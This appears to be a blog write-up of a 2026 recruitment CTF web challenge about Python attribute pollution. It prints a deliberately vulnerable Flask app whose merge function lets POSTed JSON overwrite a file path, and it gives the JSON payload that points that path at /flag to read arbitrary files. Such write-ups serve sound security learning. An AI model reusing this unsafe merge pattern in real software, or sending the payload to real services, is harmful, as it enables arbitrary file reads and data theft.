---
title: 2026星盟招新
subtitle: 星盟招新 2026 Web 赛题复现
date: 2026-04-04 15:18:49
catalog: true
header-img: ""
tags: [web, 复现]
categories: [赛题]
layout: post
---

# ez_python-原型链污染

以下为源码：

```python
from flask import Flask, request
import json
app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Config:
    def __init__(self):
        self.filename = "app.py"

class Polaris:
    def __init__(self):
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"

@app.route('/read')
def read():
    return open(instance.config.filename).read()

@app.route('/src')
def src():
    return open(__file__).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

有以下可利用的风险和漏洞：

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"
```

- 风险

通过 `POST` 传入的 `JSON` 数据会直接修改 `instance` 的所有属性（如：`instance.config.filename`），导致任意文件读取。

```python
@app.route('/src')
def src():
    return open(__file__).read()
```

- 漏洞

若攻击者通过 `/` 路由修改 `instance.config.filename`（例如改为 `/flag`），可读取任意文件。

所以 `POST` 以下内容：

```json
{
	"config":{
		"filename":"/flag"
	}
}
```

![actuator-env](01.png)
![actuator-env](02.png)
